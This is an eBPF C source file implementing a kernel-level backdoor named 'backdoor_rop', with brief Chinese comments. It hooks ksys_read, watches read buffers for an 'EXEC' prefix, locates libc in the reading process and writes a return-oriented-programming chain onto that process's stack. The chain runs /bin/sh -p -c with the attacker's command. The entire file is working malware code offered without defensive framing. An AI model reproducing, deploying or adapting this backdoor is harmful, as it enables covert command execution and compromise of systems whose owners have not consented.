#define __TARGET_ARCH_x86

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

struct bpf_iter_task_vma;

extern int bpf_iter_task_vma_new(struct bpf_iter_task_vma *it,
                                 struct task_struct *task,
                                 __u64 addr) __ksym;

extern struct vm_area_struct *bpf_iter_task_vma_next(struct bpf_iter_task_vma *it) __ksym;

extern void bpf_iter_task_vma_destroy(struct bpf_iter_task_vma *it) __ksym;

static int match_command(char *buffer) {
    if (buffer[0] != 'E' || buffer[1] != 'X' || buffer[2] != 'E' || buffer[3] != 'C') {
        return 0;
    }
    return 1;
}

SEC("fexit/ksys_read")
int BPF_PROG(backdoor_rop, unsigned int _, char *read_buf, size_t count, int ret) {
    if (ret <= 0) {
        return 0;
    }

    char buffer[32];
    int size;
    if (ret >= sizeof(buffer)) {
        size = sizeof(buffer) - 1;
    } else {
        size = ret;
    }
    bpf_core_read_user(buffer, size, read_buf);
    buffer[size] = '\0';

    // bpf_printk("size: %d, buffer: %s", size, buffer);
    if (!match_command(buffer)) {
        return 0;
    }
    char *command = &buffer[4];

    bpf_printk("bpf prog hook read success\n");
    bpf_printk("command: %s", command);

    struct task_struct *curr_task = (struct task_struct *) bpf_get_current_task_btf();
    bpf_printk("bpf pid %d", curr_task->pid);
    struct mm_struct *mm = curr_task->mm;
    bpf_printk("mm addr %lx", mm);
    bpf_printk("mmap_base addr %lx", mm->mmap_base);

    struct bpf_iter_task_vma vma_it;
    struct vm_area_struct *vma_ptr;
    bpf_iter_task_vma_new(&vma_it, curr_task, 0);

    int found = 0;
    char filename_buf[32];
    struct file *vm_file;
    struct qstr filename_qstr;
    int read_len;
    char *libc_base = NULL;

    // 这个一定需要, 不然程序尺寸会过大
#pragma unroll
    for (int i = 0; i < 512; i++) {
        vma_ptr = bpf_iter_task_vma_next(&vma_it);
        vm_file = BPF_CORE_READ(vma_ptr, vm_file);
        if (vm_file) {
            filename_qstr = BPF_CORE_READ(vm_file, f_path.dentry, d_name);
            read_len = filename_qstr.len;
            if (read_len >= sizeof(filename_buf)) {
                read_len = sizeof(filename_buf) - 1;
            }
            bpf_core_read(filename_buf, read_len, filename_qstr.name);
            filename_buf[read_len] = '\x00';
            // bpf_printk("mmap vm_file %s", filename_buf);

            if (bpf_strncmp(filename_buf, sizeof(filename_buf), "libc-2.31.so") == 0) {
                found = 1;
                libc_base = (char *) BPF_CORE_READ(vma_ptr, vm_start);
                break;
            }
        }
    }

    bpf_iter_task_vma_destroy(&vma_it);

    if (!found) {
        bpf_printk("libc not found!");
        return 0;
    }

    bpf_printk("libc found, base %lx", libc_base);

    struct pt_regs *regs = (struct pt_regs *) bpf_task_pt_regs(curr_task);
    // 逆天 libpthread read 没有用 rbp, 直接拿 rsp 算的 rbp
    // void *rbp = (void *) PT_REGS_FP(regs);
    // char *ret_addr = rbp + sizeof(rbp);
    // bpf_printk("rbp addr %lx", rbp);
    char *ret_addr = (void *) PT_REGS_SP(regs);
    bpf_printk("rsp addr %lx", PT_REGS_SP(regs));
    bpf_printk("rip addr %lx", PT_REGS_IP(regs));

    const int gadgets_length = 12;
    void *gadgets[] = {
            (void *) libc_base + 821965,
            (void *) 0,
            libc_base + 153871,
            (void *) ret_addr + 56,
            libc_base + 145302,
            (void *) ret_addr + 96,
            libc_base + 823232,
            (void *) ret_addr + 96,
            (void *) ret_addr + 104,
            (void *) ret_addr + 112,
            (void *) ret_addr + 120,
            (void *) 0,
    };
    char constants[] = "/bin/sh\x00-p\x00$$$$$-c\x00$$$$$";

#pragma unroll
    for (int i = 0; i < gadgets_length; i++) {
        bpf_probe_write_user(ret_addr + sizeof(ret_addr) * i, &gadgets[i], sizeof(gadgets[i]));
        //bpf_printk("override gadget %lx status %d", ret_addr + sizeof(ret_addr) * i, status);
    }
    bpf_probe_write_user(ret_addr + sizeof(ret_addr) * gadgets_length, constants, sizeof(constants));
    //bpf_printk("override constant %lx status %d", ret_addr + sizeof(ret_addr) * gadgets_length, status);

    // -1 去掉末尾的 \0
    bpf_probe_write_user(ret_addr + sizeof(ret_addr) * gadgets_length + sizeof(constants) - 1, command, buffer + sizeof(buffer) - command);
    return 0;
}

char _license[] SEC("license") = "GPL";